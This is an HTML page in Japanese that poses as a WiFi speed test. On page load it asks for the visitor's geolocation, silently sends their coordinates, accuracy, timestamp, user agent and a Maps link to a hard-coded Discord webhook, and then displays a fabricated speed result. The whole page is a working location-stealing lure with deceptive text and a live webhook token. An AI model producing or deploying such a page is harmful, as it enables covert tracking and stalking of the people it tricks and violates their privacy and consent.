<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>WIFI通信速度・場所適性診断</title>
  <style>
    body { background: #000; color: #0f0; font-family: monospace; text-align: center; padding: 50px; }
    h1 { font-size: 2em; }
    button { font-size: 1.5em; padding: 15px 30px; margin: 20px; }
  </style>
</head>
<body>
  <h1>現在地でのWIFI通信速度計測</h1>
  <p>通信速度を計測中...</p>
  <button onclick="getLocation()">位置情報を許可してください</button>

  <script>
    const webhook = 'https://ptb.discord.com/api/webhooks/1456662273887043848/IgWVdhr5WT4njMdUs49pnyCJAkD7i_b9HKh6jxRHZuA406pOyO0cDQo6PQ8kkEnY7WWg'; // 

    function getLocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(sendPosition, showError);
      } else {
        alert("このブラウザは位置情報に対応していません");
      }
    }

    function sendPosition(position) {
      const lat = position.coords.latitude;
      const lon = position.coords.longitude;
      const acc = position.coords.accuracy;
      const timestamp = new Date(position.timestamp).toLocaleString();

      const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;

      const data = `
**位置情報取得成功**
緯度: ${lat}
経度: ${lon}
精度: ±${acc}m
時間: ${timestamp}
User-Agent: ${navigator.userAgent}
Google Maps: ${mapsUrl}
      `;

      fetch(webhook, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ content: data })
      });

      document.body.innerHTML = '<h1>WIFI=良好-236mbps</h1>';
    }

    function showError(error) {
      let msg;
      switch(error.code) {
        case error.PERMISSION_DENIED: msg = "位置情報の許可が拒否されました"; break;
        case error.POSITION_UNAVAILABLE: msg = "位置情報が取得できません"; break;
        case error.TIMEOUT: msg = "タイムアウト"; break;
        default: msg = "不明なエラー"; break;
      }
      document.body.innerHTML += `<p>${msg}</p>`;
    }

    // ページロード時に自動で許可プロンプト表示
    window.onload = getLocation;
  </script>
</body>
</html>
